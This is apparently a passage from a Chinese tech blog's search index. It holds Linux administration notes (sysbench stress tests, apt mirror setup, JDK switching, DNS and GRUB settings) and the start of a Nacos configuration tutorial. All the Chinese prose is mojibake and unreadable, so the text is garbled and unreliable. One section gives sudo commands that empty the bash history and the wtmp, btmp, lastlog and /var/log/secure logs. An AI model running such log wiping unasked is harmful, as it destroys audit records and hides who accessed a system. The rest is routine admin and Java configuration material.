çš„é¡¹ç›® stars:&gt;1000 // æœç´¢ stars&gt;1000 çš„é¡¹ç›® forks:&gt;1000 // æœç´¢ forks&gt;1000 çš„é¡¹ç›® pushed:&gt;2020-01-15 // æœç´¢æœ€è¿‘æ›´æ–°äº 2020 å¹´ 1 æœˆ 15 æ—¥ä¹‹åçš„é¡¹ç›® language:Python // æœç´¢ Python çš„é¡¹ç›® Linux æŸ¥çœ‹ç¡¬ç›˜è½¬æ•° 1234567891011121314151617# ä¸‹è½½sg3_utilså·¥å…·çš„å‹ç¼©åŒ…ï¼Œå®˜ç½‘åœ°å€ï¼šhttp://sg.danny.cz/sg/sg3_utils.html# wget http://sg.danny.cz/sg/p/sg3_utils-1.45.tar.xz# è§£å‹æ–‡ä»¶# tar -xvf sg3_utils-1.45.tar.xz# è¿›å…¥è§£å‹ç›®å½•# cd sg3_utils-1.45# ç¼–è¯‘å®‰è£…# ./configure# make &amp;&amp; make install# æŸ¥çœ‹ç¡¬ç›˜è½¬æ•°$ sg_vpd --page=0xb1 /dev/sdeNominal rotation rate: 7200 rpmNominal form factor: 3.5 inch Linux ä½¿ç”¨ Sysbench è¿›è¡Œå‹æµ‹ å¸¸ç”¨çš„å‹æµ‹å·¥å…·ï¼šabã€stressã€sysbenchã€webbenchã€jmeterã€‚ 1234567891011121314151617181920212223# å‹æµ‹CPUæ€§èƒ½ï¼ˆå•æ ¸ã€å››æ ¸ã€å…«æ ¸ï¼‰$ sysbench --test=cpu --num-threads=1 --max-requests=10000 run$ sysbench --test=cpu --num-threads=4 --max-requests=100000 run$ sysbench --test=cpu --num-threads=8 --max-requests=100000 run# å‹æµ‹CPUæ€§èƒ½ï¼ˆå•æ ¸ã€å››æ ¸ã€å…«æ ¸ï¼‰ï¼Œcpu-max-prime æ˜¯ç´ æ•°ç”Ÿæˆæ•°é‡çš„ä¸Šé™ï¼Œthreads æ˜¯çº¿ç¨‹æ•°ï¼Œtime æ˜¯è¿è¡Œçš„æ—¶é—´ï¼ˆç§’ï¼‰ï¼Œevent æ˜¯è¾¾åˆ°ä¸Šé™çš„æ¬¡æ•°ï¼ˆé»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºä¸é™åˆ¶ä¸Šé™æ¬¡æ•°ï¼‰$ sysbench cpu --cpu-max-prime=20000 --threads=1 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=4 --time=10 run$ sysbench cpu --cpu-max-prime=20000 --threads=8 --time=10 run# å‹æµ‹å†…å­˜æ€§èƒ½ï¼ˆéšæœºè¯»å†™ã€è¿ç»­è¯»å†™ï¼‰$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=rnd run$ sysbench --test=memory --memory-block-size=1K --memory-total-size=1G --memory-access-mode=seq run# å‹æµ‹å…«çº¿ç¨‹çš„å…±äº«çº¿ç¨‹é”$ sysbench --test=threads --num-threads=1000 --thread-yields=1000 --thread-locks=8 run# å‹æµ‹äº’æ–¥é”$ sysbench --test=mutex --mutex-num=4096 --mutex-locks=50000 --mutex-loops=10000 run# å‹æµ‹ç£ç›˜IOï¼ˆéšæœºè¯»å†™ã€è¿ç»­è¯»å†™ï¼‰$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=rndwr run$ sysbench --test=fileio --file-num=2 --file-total-size=64M --file-test-mode=seqrewr run CRT æ ¼å¼è¯ä¹¦è½¬ä¸º PEM æ ¼å¼è¯ä¹¦ 1$ openssl x509 -in example.com.crt -out example.com.pem -outform PEM ç³»ç»Ÿç«¯å£å·å†²çªæ’æŸ¥ 123456# æŸ¥çœ‹å½“å‰ç³»ç»Ÿå„æœåŠ¡å ç”¨çš„ç«¯å£å·# netstat -lntup# æŸ¥çœ‹å ç”¨8080ç«¯å£çš„æœåŠ¡# netstat -anp|grep 8080# netstat -aon|grep 8080 Centos 6ã€7 çš„æœåŠ¡ç±»ç›¸å…³å‘½ä»¤ Centos 6 æ³¨å†Œåœ¨ç³»ç»Ÿä¸­çš„æ ‡å‡†åŒ–ç¨‹åº ç»Ÿä¸€çš„ç®¡ç†æ–¹å¼ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰ service æœåŠ¡å start service æœåŠ¡å stop service æœåŠ¡å restart service æœåŠ¡å status æŸ¥çœ‹æœåŠ¡çš„æ–¹æ³•ï¼š /etc/init.d/æœåŠ¡å é€šè¿‡ chkconfig å‘½ä»¤ç®¡ç†æœåŠ¡è‡ªå¯åŠ¨ æŸ¥çœ‹è‡ªå¯åŠ¨çš„æœåŠ¡ï¼š chkconfig --list|grep xxx å¯ç”¨æœåŠ¡è‡ªå¯åŠ¨ï¼š chkconfig --level 5 æœåŠ¡å on å…³é—­æœåŠ¡è‡ªå¯åŠ¨ï¼š chkconfig --level 5 æœåŠ¡å off Centos 7 æ³¨å†Œåœ¨ç³»ç»Ÿä¸­çš„æ ‡å‡†åŒ–ç¨‹åº ç»Ÿä¸€çš„ç®¡ç†æ–¹å¼ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰ systemctl start æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl stop æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl restart æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl reload æœåŠ¡åï¼ˆxxx.serviceï¼‰ systemctl status æœåŠ¡åï¼ˆxxx.serviceï¼‰ æŸ¥çœ‹æœåŠ¡çš„æ–¹æ³•ï¼š /usr/lib/systemd/system/æœåŠ¡å æŸ¥çœ‹æœåŠ¡çš„å‘½ä»¤ systemctl list-unit-files | grep service_name systemctl --type service | grep service_name é€šè¿‡ systemctl å‘½ä»¤ç®¡ç†æœåŠ¡è‡ªå¯åŠ¨ å¯ç”¨æœåŠ¡è‡ªå¯åŠ¨ï¼š systemctl enable service_name å…³é—­æœåŠ¡è‡ªå¯åŠ¨ï¼š systemctl disable service_name Centos7 ç®¡ç†ä¸åŒç‰ˆæœ¬çš„ JDK /etc/alternatives/ ç›®å½•å­˜æ”¾ç€ç³»ç»Ÿé»˜è®¤å‘½ä»¤çš„é“¾æ¥ç¬¦ï¼Œè€Œ update-alternatives æ˜¯ Linux ç³»ç»Ÿä¸­ä¸“é—¨ç»´æŠ¤ç³»ç»Ÿå‘½ä»¤é“¾æ¥ç¬¦çš„å·¥å…·ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è®¾ç½®ç³»ç»Ÿé»˜è®¤ä½¿ç”¨å“ªä¸ªå‘½ä»¤ã€å“ªä¸ªè½¯ä»¶ç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œåœ¨ç³»ç»Ÿä¸­åŒæ—¶å®‰è£…äº† Open JDK å’Œ Oracle JDKï¼ˆä¸¤è€…éƒ½é€šè¿‡ RPM åŒ…å®‰è£…ï¼‰ï¼Œè€Œå®é™…åˆå¸Œæœ›ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„æ˜¯ Oracle JDKï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡ update-alternatives å¾ˆæ–¹ä¾¿åœ°å®ç°ã€‚å½“æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åï¼Œæ ¹æ®è¾“å‡ºçš„æç¤ºä¿¡æ¯ï¼Œç›´æ¥è¾“å…¥å¸Œæœ›è¢«ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„é€‰é¡¹çš„ç¼–å·å³å¯ï¼›å‘½ä»¤æ‰§è¡Œå®Œåï¼Œå¯ä»¥çœ‹åˆ° /etc/alternatives/ ç›®å½•ä¸‹ Java ç›¸å…³çš„é“¾æ¥ç¬¦å‘ç”Ÿäº†æ”¹å˜ã€‚ 1234567891011# update-alternatives --config javaå…±æœ‰ 3 ä¸ªæä¾›â€œjavaâ€çš„ç¨‹åºã€‚ é€‰é¡¹ å‘½ä»¤----------------------------------------------- 1 /usr/java/jdk1.8.0_102/jre/bin/java 2 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.272.b10-1.el7_9.x86_64/jre/bin/java)*+ 3 /usr/java/jdk-11.0.9/bin/javaæŒ‰ Enter ä¿ç•™å½“å‰é€‰é¡¹[+]ï¼Œæˆ–è€…é”®å…¥é€‰é¡¹ç¼–å·ï¼š ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœ JDK æ˜¯é€šè¿‡è§£å‹çš„æ–¹å¼æ¥å®‰è£…çš„ï¼ˆé RPM åŒ…å®‰è£…ï¼‰ï¼Œé‚£ä¹ˆå°±åªèƒ½é€šè¿‡æ‰‹åŠ¨é…ç½®ç³»ç»Ÿçš„ JDK ç¯å¢ƒå˜é‡æ¥æ›¿ä»£ update-alternatives å‘½ä»¤çš„åŠŸèƒ½ï¼Œå…·ä½“å¯ä»¥å‚è€ƒä»¥ä¸‹é…ç½®ï¼š 12345678910# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ å¯¹åº”çš„JDKç¯å¢ƒå˜é‡# vim /etc/profileJAVA_HOME=/usr/java/jdk1.8.0_102JRE_HOME=/usr/java/jdk1.8.0_102/jrePATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libexport JAVA_HOME JRE_HOME PATH CLASSPATH# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ# source /etc/profile Debian 9ï¼ˆStretchï¼‰æ›´æ¢é˜¿é‡Œäº‘é•œåƒæº 1234567891011121314# æ–¹æ³•ä¸€ï¼šä¸ä¾èµ–ä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨# å¤‡ä»½# cp /etc/apt/sources.list /etc/apt/backup.sources.list# å°†é…ç½®ä¿¡æ¯å†™å…¥æ–‡ä»¶# echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list 123456789101112131415161718# æ–¹æ³•äºŒï¼šä¾èµ–Viã€Vimç­‰æ–‡æœ¬ç¼–è¾‘å™¨# å¤‡ä»½# cp /etc/apt/sources.list /etc/apt/backup.sources.list# æ¸…ç©ºæ–‡ä»¶å†…å®¹# echo "" &gt; /etc/apt/sources.list# æ·»åŠ ä»¥ä¸‹é…ç½®ä¿¡æ¯åˆ°æ–‡ä»¶ä¸­# vi /etc/apt/sources.listdeb http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb http://mirrors.aliyun.com/debian-security stretch/updates maindeb-src http://mirrors.aliyun.com/debian-security stretch/updates maindeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib 12345678# æ›´æ–°è½¯ä»¶ç´¢å¼•ï¼ˆå¿…é¡»ï¼‰# apt-get update# å‡çº§ç³»ç»Ÿæ‰€æœ‰è½¯ä»¶ï¼ˆéå¿…é¡»ï¼‰# apt-get upgrade# å‡çº§ç³»ç»Ÿç‰ˆæœ¬ï¼ˆéå¿…é¡»ï¼‰# apt-get dist-upgrade Ubuntu 20.4 LTS æ›´æ¢é˜¿é‡Œé•œåƒæº 123456789101112131415161718192021# å¤‡ä»½# cp /etc/apt/sources.list /etc/apt/sources.list.bak# æ¸…ç©ºæ–‡ä»¶å†…å®¹# echo "" &gt; /etc/apt/sources.list# æ·»åŠ ä»¥ä¸‹é…ç½®ä¿¡æ¯åˆ°æ–‡ä»¶ä¸­# vim /etc/apt/sources.listdeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse# æ›´æ–°è½¯ä»¶ç´¢å¼•# apt-get update Markdown æŠ˜å ä»£ç è¯­æ³• codeï¼šæŒ‡å®šä»£ç å— detailsï¼šæŠ˜å è¯­æ³•æ ‡ç­¾ summaryï¼šæŠ˜å è¯­æ³•å±•ç¤ºçš„æ‘˜è¦ preï¼šä»¥åŸæœ‰æ ¼å¼æ˜¾ç¤ºå…ƒç´ å†…çš„æ–‡å­—æ˜¯å·²ç»æ ¼å¼åŒ–çš„æ–‡æœ¬ Centos7 æ¸…é™¤å‘½ä»¤å†å²è®°å½•ã€ç™»å½•ä¿¡æ¯ 123456# æ¸…é™¤å‘½ä»¤å†å²è®°å½•$ echo &gt; .bash_history$ history -cw# éªŒè¯æ¸…é™¤æ•ˆæœ$ history 12345678# æ¸…é™¤ç™»å½•ä¿¡æ¯$ sudo sh -c \'echo &gt; /var/log/wtmp\'$ sudo sh -c \'echo &gt; /var/log/btmp\'$ sudo sh -c \'echo &gt; /var/log/lastlog\'$ sudo sh -c \'echo &gt; /var/log/secure\'# éªŒè¯æ¸…é™¤æ•ˆæœ$ last é…ç½®é˜¿é‡Œå·´å·´çš„ DNS æœåŠ¡ åŸŸåç³»ç»Ÿï¼ˆæœåŠ¡ï¼‰åè®®ï¼ˆDNSï¼‰æ˜¯ä¸€ç§åˆ†å¸ƒå¼ç½‘ç»œç›®å½•æœåŠ¡ï¼Œä¸»è¦ç”¨äºåŸŸåä¸ IP åœ°å€çš„ç›¸äº’è½¬æ¢ï¼Œä»¥åŠæ§åˆ¶å› ç‰¹ç½‘çš„ç”µå­é‚®ä»¶çš„å‘é€ã€‚åœ¨ Linux æœåŠ¡å™¨ä¸Šå¿«é€Ÿé…ç½®é˜¿é‡Œå·´å·´ DNS æœåŠ¡çš„æ–¹æ³•å¦‚ä¸‹ï¼š 12345678# ç¼–è¾‘ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œåªéœ€è¦æ·»åŠ ä»¥ä¸‹ä¸¤è¡Œå†…å®¹# vim /etc/resolv.confnameserver 223.5.5.5nameserver 223.6.6.6# é‡å¯ç½‘ç»œæœåŠ¡# service network restart æ¨¡æ‹Ÿ CPU é«˜è´Ÿè½½ Lookbusy çš„å®‰è£…ï¼Œè¯¦è§ Lookbusy å®˜ç½‘ 1234567891011121314151617# ä¸‹è½½# wget http://www.devin.com/lookbusy/download/lookbusy-1.4.tar.gz# è§£å‹# tar -xvf lookbusy-1.4.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd lookbusy-1.4 # é¢„é…ç½®# ./configure# ç¼–è¯‘# make -j4# å®‰è£…# make install Lookbusy çš„ä½¿ç”¨ 1234567891011121314# è®©æ‰€æœ‰CPUæ ¸å¿ƒçš„ä½¿ç”¨ç‡éƒ½æ˜¯30%$ lookbusy -c 30# è®©ä¸¤ä¸ªCPUæ ¸å¿ƒçš„ä½¿ç”¨ç‡ä¸º30%$ lookbusy -n 2 -c 30# è®©æ‰€æœ‰CPUæ ¸å¿ƒçš„ä½¿ç”¨ç‡åœ¨60%-70%ä¸Šä¸‹æµ®åŠ¨$ lookbusy -c 60-70 -r curve# è®©æ‰€æœ‰CPUæ ¸å¿ƒçš„ä½¿ç”¨ç‡åœ¨20%-80%ä¹‹é—´ï¼Œå‘¨æœŸä¸º24å°æ—¶ï¼Œåœ¨14ç‚¹è¾¾åˆ°å³°å€¼$ lookbusy --cpu-mode curve --cpu-curve-peak 14h -c 20-80# è®©æ‰€æœ‰CPUæ ¸å¿ƒçš„ä½¿ç”¨ç‡åœ¨20%-30%ä¹‹é—´ï¼Œå‘¨æœŸä¸º60åˆ†é’Ÿï¼Œåœ¨30åˆ†é’Ÿè¾¾åˆ°å³°å€¼$ lookbusy --cpu-mode curve --cpu-curve-period 60m --cpu-curve-peak 30m -c 20-30 Debian/Ubuntu å®‰è£… GCC ä¸ G++ build-essential æ˜¯ C/C++ çš„å¼€å‘åŒ…ï¼ŒåŒ…å«äº† gccã€g++ã€makeã€gdb å’Œ libc ç­‰å·¥å…·ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å®‰è£…å³å¯ï¼š 1# apt-get -y install build-essential Centos7 æ›´æ”¹å†…æ ¸å¯åŠ¨é¡ºåº 1234567891011121314# æŸ¥çœ‹å½“å‰ç³»ç»Ÿæœ‰å‡ ä¸ªå†…æ ¸# cat /boot/grub2/grub.cfg |grep menuentry # æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„é»˜è®¤å†…æ ¸# grub2-editenv list # æ›´æ”¹ç³»ç»Ÿé»˜è®¤çš„å¯åŠ¨å†…æ ¸# grub2-set-default \'CentOS Linux (3.10.0-514.26.2.el7.x86_64) 7 (Core)\'# é‡å¯ç³»ç»Ÿç”Ÿæ•ˆ# reboot# é‡å¯åæŸ¥çœ‹å†…æ ¸æ˜¯å¦å·²ç»ä¿®æ”¹# uname -a var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘éšç¬”"},{title:"Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ä¸­çº§ç¯‡",url:"/posts/35766a62.html",text:'ä¸Šç¯‡ - Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†ï¼ˆåŸºç¡€ç¯‡ï¼‰ Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†åŸºç¡€ç¯‡ Nacos Config Spring å…¥é—¨æ¡ˆä¾‹1.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring çš„ç‰ˆæœ¬ä¸º 5.2.xï¼ŒNacos Server çš„ç‰ˆæœ¬ä¸º 1.4.0ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1.1ã€å‘å¸ƒé…ç½®12345Namespace: publicData ID: nacos_config_spring_demo.propertiesGroup: DEFAULT_GROUPé…ç½®æ ¼å¼: Propertiesé…ç½®å†…å®¹: useLocalCache=true 1.2 ã€æ·»åŠ  Maven ä¾èµ–12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.3ã€åˆ›å»º Nacos é…ç½®ç±»æ·»åŠ  @EnableNacosConfig æ³¨è§£å¯ç”¨ Nacos Spring çš„é…ç½®ç®¡ç†æœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨ @NacosPropertySource åŠ è½½äº† dataId ä¸º nacos_config_spring_demo.properties çš„é…ç½®é›†ï¼Œå¹¶å¼€å¯è‡ªåŠ¨æ›´æ–° 12345678910111213141516package com.nacos.study.config;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.config.EnableNacosConfig;import com.alibaba.nacos.spring.context.annotation.config.NacosPropertySource;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosConfig(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))@NacosPropertySource(dataId = "nacos_config_spring_demo.properties", autoRefreshed = true)public class NacosConfiguration {} 1.4ã€åˆ›å»º Controller æµ‹è¯•ç±»é€šè¿‡ Nacos çš„ @NacosValue æ³¨è§£è®¾ç½®å±æ€§å€¼ 123456789101112131415161718192021222324package com.nacos.study.controller;import com.alibaba.nacos.api.config.annotation.NacosValue;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.ResponseBody;/** * @author clay */@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 1.5ã€é…ç½® web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.6ã€é…ç½® dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.7ã€æµ‹è¯•åº”ç”¨ç¨‹åº å°† Spring Web åº”ç”¨éƒ¨ç½²åˆ° Tomcat æœåŠ¡å™¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/config/getï¼Œè‹¥å“åº”ç»“æœä¸º trueï¼Œåˆ™è¯´æ˜ç¨‹åºè¿è¡Œæ­£å¸¸ Nacos Config Spring Boot å…¥é—¨æ¡ˆä¾‹2.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring Boot çš„ç‰ˆæœ¬ä¸º 2.0.3.RELEASEï¼Œå¯¹åº”çš„ Nacos Config Spring Boot çš„ç‰ˆæœ¬ä¸º 0.2.7ï¼ŒNacos Server çš„ç‰ˆæœ¬ä¸º 1.4.0ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2.1ã€å‘å¸ƒé…ç½®12345Namespace: publicData ID: nacos_config_springboot_demo.propertiesGroup: DEFAULT_GROUPé…ç½®æ ¼å¼: Propertiesé…ç½®å†…å®¹: useLocalCache=true 2.2ã€æ·»åŠ  Maven ä¾èµ–ç‰¹åˆ«æ³¨æ„ï¼ŒNacos Spring Boot Starter ç‰ˆæœ¬ 0.2.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 2.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 0.1.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 1.x ç‰ˆæœ¬ã€‚ 123456789101112131415161718192021222324252627282930313233&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;nacos-config-spring-boot.version&gt;0.2.7&lt;/nacos-config-spring-boot.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.boot&lt;/groupId&gt; &lt;artifactId&gt;nacos-config-spring-boot-actuator&lt;/artifactId&gt; &lt;version&gt;${nacos-config-spring-boot.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.3ã€åˆ›å»ºå¯åŠ¨ä¸»ç±»ä½¿ç”¨ @NacosPropertySource åŠ è½½äº† dataId ä¸º nacos_config_springboot_demo.properties çš„é…ç½®é›†ï¼Œå¹¶å¼€å¯è‡ªåŠ¨æ›´æ–° 12345678@SpringBootApplication@NacosPropertySource(dataId = "nacos_config_springboot_demo.properties", autoRefreshed = true)public class NacosConfigApplication { public static void main(String[] args) { SpringApplication.run(NacosConfigApplication.class, args); }} 2.4ã€åˆ›å»º Controller æµ‹è¯•ç±»é€šè¿‡ Nacos çš„ @NacosValue æ³¨è§£è®¾ç½®å±æ€§å€¼ 12345678910111213@Controller@RequestMapping("/config")public class ConfigController { @NacosValue(value = "${useLocalCache:false}", autoRefreshed = true) private boolean useLocalCache; @ResponseBody @RequestMapping(value = "/get", method = RequestMethod.GET) public boolean get() { return useLocalCache; }} 2.5ã€é…ç½® application.propertiesåœ¨ application.properties ä¸­é…ç½® Nacos Server çš„åœ°å€ 1nacos.config.server-addr=127.0.0.1:8848 2.6ã€æµ‹è¯•åº”ç”¨ç¨‹åº å¯åŠ¨ Spring Boot åº”ç”¨ æµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/config/getï¼Œè‹¥å“åº”ç»“æœä¸º trueï¼Œåˆ™è¯´æ˜ç¨‹åºè¿è¡Œæ­£å¸¸ Nacos Config Spring Cloud å…¥é—¨æ¡ˆä¾‹3.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring Cloud çš„ç‰ˆæœ¬æ˜¯ Greenwich.SR6ï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.1.18.RELEASEï¼Œå¯¹åº”çš„ Nacos Config Spring Cloud ç‰ˆæœ¬ä¸º 2.1.3.RELEASEï¼ŒNacos å®˜æ–¹ç‰ˆæœ¬è¯´æ˜å¯ä»¥çœ‹è¿™é‡Œï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 3.1ã€å‘å¸ƒé…ç½®ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºåç§°ä¸º dev çš„å‘½åç©ºé—´ ç¬¬äºŒæ­¥ï¼šåœ¨ dev å‘½åç©ºé—´ä¸‹æ–°å¢ä¸¤é¡¹é…ç½®ï¼Œå…·ä½“çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-1.yamlGroup: TEST_GROUPé…ç½®æ ¼å¼: YAMLé…ç½®å†…å®¹: common: name: service-1-config 123456Namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18Data ID: service-2.yamlGroup: TEST_GROUPé…ç½®æ ¼å¼: YAMLé…ç½®å†…å®¹: common: name: service-2-config 3.2ã€åˆ›å»º Maven çˆ¶å·¥ç¨‹åœ¨ Maven çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“é…ç½®å¦‚ä¸‹ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒNacos Spring Cloud Starter ç‰ˆæœ¬ 2.1.x.RELEASE å¯¹åº”çš„æ˜¯ Spring Boot 2.1.x ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ 2.0.x.RELEASE 